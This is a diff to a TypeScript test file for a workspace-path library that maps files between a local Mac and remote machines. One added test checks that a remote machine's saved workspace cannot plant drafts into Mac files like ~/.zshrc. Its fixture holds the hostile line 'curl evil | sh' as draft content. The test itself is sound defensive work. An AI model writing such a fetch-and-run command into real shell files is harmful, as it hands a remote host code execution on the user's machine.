@@ -1,6 +1,6 @@
 import assert from 'node:assert/strict';
 import test from 'node:test';
-import { assertSaveAllowed, mapWorkspaceSnapshotPaths, parseRemoteWorkspacePath, qualifyWorkspaceResult, remoteWorkspacePath, remoteWorkspaceRequest, sessionWorkspaceRoot, workspaceChangePath } from '../src/lib/workspacePaths.ts';
+import { assertSaveAllowed, mapWorkspaceSnapshotPaths, nativeWorkspacePath, parseRemoteWorkspacePath, revealDisabledReason, qualifyWorkspaceResult, remoteWorkspacePath, remoteWorkspaceRequest, sessionCheckoutRoot, sessionWorkspaceRoot, workspaceChangePath } from '../src/lib/workspacePaths.ts';
 
 test('a workspace keeps its machine even when another session is selected', () => {
   const first = remoteWorkspacePath('workbox', '/home/me/project/a.ts');
@@ -43,6 +43,14 @@ test('a session is rooted at its project, not the folder it works in', () => {
   assert.equal(sessionWorkspaceRoot({ cwd: '/worktrees/tsk-1', projectId: 'p2', executionEnvironment: 'local' }, projects), '/worktrees/tsk-1');
 });
 
+test('Source Control follows the folder the session works in, even when a project roots its files', () => {
+  assert.equal(sessionCheckoutRoot({ cwd: '/worktrees/repo/feature-x', projectId: 'p1', executionEnvironment: 'local' }), '/worktrees/repo/feature-x');
+  assert.equal(
+    sessionCheckoutRoot({ cwd: '/srv/worktrees/a', projectId: 'p2', executionEnvironment: 'remote', remoteProfileId: 'box' }),
+    'assembly-remote://box/srv/worktrees/a'
+  );
+});
+
 test('saved workspace paths round trip without retaining a client profile or rewriting drafts', () => {
   const stored = { openPaths: ['/home/me/a.txt'], activePath: '/home/me/a.txt', filesInspectionRoot: '/home/me', expandedPathsByRoot: { '/home/me': ['/home/me/sub'] }, fileStates: { '/home/me/a.txt': { content: '/home/me/leave-content-alone' } } };
   const projected = mapWorkspaceSnapshotPaths(stored, 'workbox');
@@ -74,11 +82,28 @@ test("the session's own files saved while viewing a remote project reload on the
   assert.deepEqual(stored.openPaths, ['/Users/me/repo/a.ts', `${viewed}/a.ts`]);
   assert.deepEqual(mapWorkspaceSnapshotPaths(stored, null), open);
 
-  // A Workbox session viewing a Mac project: its own files go back to Workbox, the Mac files to the Mac.
+  // A Workbox session viewing a Mac project saves its own files natively and the Mac files as file:// paths.
   const fromWorkbox = { viewedProjectRoot: '/Users/me/mac-proj', openPaths: ['/Users/me/mac-proj/x.ts', 'assembly-remote://workbox/home/me/session/y.ts'] };
   const storedFromWorkbox = mapWorkspaceSnapshotPaths(fromWorkbox, 'workbox', 'save') as typeof fromWorkbox;
   assert.deepEqual(storedFromWorkbox, { viewedProjectRoot: 'file:///Users/me/mac-proj', openPaths: ['file:///Users/me/mac-proj/x.ts', '/home/me/session/y.ts'] });
-  assert.deepEqual(mapWorkspaceSnapshotPaths(storedFromWorkbox, 'workbox'), fromWorkbox);
+});
+test("a remote machine's saved workspace cannot open Mac files", () => {
+  // The remote machine keeps this record, so it could name any Mac file and give it an unsaved draft
+  // that Save would then write to the Mac. Every Mac path in it is dropped when it loads.
+  const mac = 'file:///Users/me/.zshrc';
+  const stored = {
+    openPaths: [mac, '/home/me/y.ts'], activePath: mac, selectedPath: mac, viewedProjectRoot: 'file:///Users/me',
+    fileStates: { [mac]: { draftContent: 'curl evil | sh' }, '/home/me/y.ts': { draftContent: 'mine' } },
+    topTabs: { order: [`editor:${mac}`, 'editor:/home/me/y.ts'], activeKey: `editor:${mac}` },
+    expandedPathsByRoot: { 'file:///Users/me': ['file:///Users/me/.ssh'], '/home/me': ['file:///Users/me/.ssh', '/home/me/src'] }
+  };
+  const own = 'assembly-remote://workbox/home/me/y.ts';
+  assert.deepEqual(mapWorkspaceSnapshotPaths(stored, 'workbox'), {
+    openPaths: [own], activePath: null, selectedPath: null, viewedProjectRoot: null,
+    fileStates: { [own]: { draftContent: 'mine' } },
+    topTabs: { order: [`editor:${own}`], activeKey: null },
+    expandedPathsByRoot: { 'assembly-remote://workbox/home/me': ['assembly-remote://workbox/home/me/src'] }
+  });
 });
 test('two machines with the same path stay separate in a saved workspace', () => {
   const own = 'assembly-remote://workbox/home/me/a.ts';
@@ -131,4 +156,11 @@ test('moved project changes browse root without changing cwd', () => {
     assert.equal(sessionWorkspaceRoot(session, projects), executionEnvironment === 'local' ? '/projects/b' : 'assembly-remote://box/projects/b');
     assert.equal(session.cwd, '/original');
   }
+});
+test('copy path gives the path on the owning machine, and reveal is off for remote files', () => {
+  const remote = remoteWorkspacePath('workbox', '/home/me/project/a.ts');
+  assert.equal(nativeWorkspacePath(remote), '/home/me/project/a.ts');
+  assert.equal(nativeWorkspacePath('/Users/me/project/a.ts'), '/Users/me/project/a.ts');
+  assert.match(revealDisabledReason(remote) ?? '', /remote machine/);
+  assert.equal(revealDisabledReason('/Users/me/project/a.ts'), null);
 });
